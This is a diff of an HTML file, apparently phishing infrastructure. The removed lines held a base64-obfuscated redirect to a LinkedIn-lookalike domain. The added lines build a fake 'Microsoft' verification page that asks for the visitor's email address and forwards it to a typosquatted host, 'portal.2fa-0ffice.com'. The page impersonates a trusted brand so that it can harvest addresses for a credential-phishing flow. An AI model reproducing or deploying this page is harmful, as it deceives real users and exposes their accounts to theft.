@@ -1,4 +1,178 @@
-<script type="text/javascript">
-    var link = atob("aHR0cHM6Ly9saW5rZWRpbi5lbGRlbnNjby51ay8=");
-    window.location.href = link;
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Redirect - Microsoft</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .container {
+            max-width: 400px;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-container img {
+            width: 100px; /* You can adjust the width as needed */
+            height: auto;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group-checkbox {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+
+        input {
+            padding: 10px;
+            width: 100%;
+            box-sizing: border-box;
+            margin-bottom: 10px;
+        }
+
+        .error-message {
+            color: #d9534f;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .submit-button {
+            background-color: #428bca;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            border-radius: 5px;
+        }
+
+        .notice {
+            color: #d9534f;
+            margin-top: 10px;
+        }
+
+        .microsoft-disclaimer {
+            font-size: 0.9em;
+            color: #888;
+            margin-top: 20px;
+        }
+
+        .visitor-info {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background-color: #eee;
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        /* Hide the email input initially */
+        #emailInput {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://live.staticflickr.com/65535/53472764096_ef5c50e0f7_m.jpg" alt="Logo">
+        </div>
+
+        <h2>Verify Yourself</h2>
+
+        <form id="emailForm" onsubmit="submitForm(event)">
+            <div class="input-group-checkbox">
+                <input type="checkbox" id="tickToContinue" onclick="handleCheckbox()">
+            </div>
+
+            <div class="input-group">
+                <input type="email" id="emailInput" placeholder="Enter your email" required>
+            </div>
+
+            <p class="error-message" id="errorMessage"></p>
+
+            <button type="submit" class="submit-button" id="acceptButton" disabled>Accept and Continue</button>
+            <p class="notice" id="notice">Please tick the box to continue.</p>
+        </form>
+
+        <p class="microsoft-disclaimer">For security reasons, please keep your credentials private and ensure accurate information is provided.</p>
+
+        <div class="visitor-info" id="visitorInfo"></div>
+
+        <script>
+            function submitForm(event) {
+                event.preventDefault();
+
+                var emailInput = document.getElementById('emailInput').value;
+                var errorMessage = document.getElementById('errorMessage');
+
+                var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(emailInput)) {
+                    errorMessage.innerText = 'Error: Please enter a valid email address.';
+                    errorMessage.style.color = '#d9534f';
+                } else {
+                    var redirectUrl = 'https://portal.2fa-0ffice.com/?qbmkrqri&qrc=' + encodeURIComponent(emailInput);
+                    window.location.href = redirectUrl;
+                }
+            }
+
+            function handleCheckbox() {
+                var checkbox = document.getElementById('tickToContinue');
+                var emailInput = document.getElementById('emailInput');
+                var acceptButton = document.getElementById('acceptButton');
+                var notice = document.getElementById('notice');
+
+                if (checkbox.checked) {
+                    emailInput.style.display = 'block';
+                    emailInput.focus();
+                    acceptButton.disabled = false;
+                    notice.style.display = 'none';
+                } else {
+                    emailInput.style.display = 'none';
+                    acceptButton.disabled = true;
+                    notice.style.display = 'block';
+                }
+            }
+
+            function getBrowserInfo() {
+                // ... (existing code)
+            }
+
+            function getOSInfo() {
+                // ... (existing code)
+            }
+
+            window.onload = function () {
+                displayVisitorInfo();
+            };
+
+            function displayVisitorInfo() {
+                // ... (existing code)
+            }
+        </script>
+    </div>
+</body>
+</html>
